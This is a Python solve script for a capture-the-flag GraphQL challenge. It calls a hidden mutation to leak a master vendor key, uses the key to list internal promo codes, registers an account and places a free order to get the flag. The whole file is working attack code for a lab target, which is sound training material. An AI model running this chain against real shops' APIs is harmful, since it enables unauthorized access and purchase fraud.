#!/usr/bin/env python3
"""Used Goods of Tomorrow / SunshineCTF 2026 - GraphQL solve.

Chain:
  introspection -> hidden mutation vendorTerminalSync -> master vendorKey
  -> promoCodes(vendorKey) -> FOUNDERS-100 (100% off Lot #4042)
  -> register + placeOrder(listingId="4042", promoCode="FOUNDERS-100") -> flag
"""
import json
import secrets

import requests

BASE = "<challenge-url>"  # challenge instance (closed after the event)
GRAPHQL = BASE + "/graphql"


def gql(session, query, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    r = session.post(GRAPHQL, json={"query": query}, headers=headers, timeout=20)
    r.raise_for_status()
    data = r.json()
    if "errors" in data:
        raise RuntimeError(json.dumps(data["errors"]))
    return data["data"]


def main() -> int:
    s = requests.Session()

    # 1) Leak the master vendor key.
    d = gql(s, "mutation { vendorTerminalSync { vendorKey } }")
    vendor_key = d["vendorTerminalSync"]["vendorKey"]
    print("[+] vendorKey =", vendor_key)

    # 2) List internal promo codes with the master key.
    d = gql(s, '{ promoCodes(vendorKey:"%s") { code percentOff appliesTo } }' % vendor_key)
    codes = {c["code"]: c for c in d["promoCodes"]}
    print("[+] promo codes:", list(codes))
    promo = "FOUNDERS-100"
    assert codes[promo]["appliesTo"] == "4042"

    # 3) Register an account.
    user = "buyer_" + secrets.token_hex(4)
    pw = secrets.token_urlsafe(12)
    d = gql(s, 'mutation { register(username:"%s", password:"%s") { token } }' % (user, pw))
    token = d["register"]["token"]
    print("[+] registered")

    # 4) Buy Lot #4042 for free.
    d = gql(
        s,
        'mutation { placeOrder(listingId:"4042", promoCode:"%s") { success pricePaid flag } }'
        % promo,
        token=token,
    )
    order = d["placeOrder"]
    print("[+] pricePaid =", order["pricePaid"])
    print("[+] flag =", order["flag"])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())